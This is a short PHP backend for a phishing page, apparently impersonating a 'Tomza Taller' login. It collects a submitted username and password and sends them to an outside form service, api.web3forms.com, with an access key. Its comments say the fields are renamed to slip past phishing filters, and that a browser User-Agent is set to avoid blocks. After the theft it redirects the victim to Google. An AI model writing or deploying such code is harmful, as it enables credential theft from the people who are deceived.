<?php
// Evitar acceso directo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibir datos (coinciden con el 'name' del HTML)
$usuario = trim($_POST["usuario"] ?? "");
$password = trim($_POST["password"] ?? "");

if ($usuario === "" || $password === "") {
    die("Faltan datos.");
}

$access_key = "bafc5339-b2a5-4e5b-bad7-a4d93a053174";

// Datos a enviar (renombrados para evitar filtros de phishing)
$datos = [
    "access_key" => $access_key,
    "subject" => "Nuevo ingreso - Tomza Taller",
    "ID_Usuario" => $usuario,
    "Llave_Acceso" => $password,
    "Fecha" => date("d/m/Y H:i:s")
];

// Configuración con User-Agent para evitar error 403
$opciones = [
    "http" => [
        "header" => "Content-Type: application/x-www-form-urlencoded\r\n" .
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n",
        "method" => "POST",
        "content" => http_build_query($datos),
        "timeout" => 10
    ]
];

// Enviar
$contexto = stream_context_create($opciones);
$resultado = @file_get_contents("https://api.web3forms.com/submit", false, $contexto);

if ($resultado === false) {
    echo "Error al enviar: " . error_get_last()['message'];
} else {
    header("Location: https://www.google.com");
}
exit;
?>
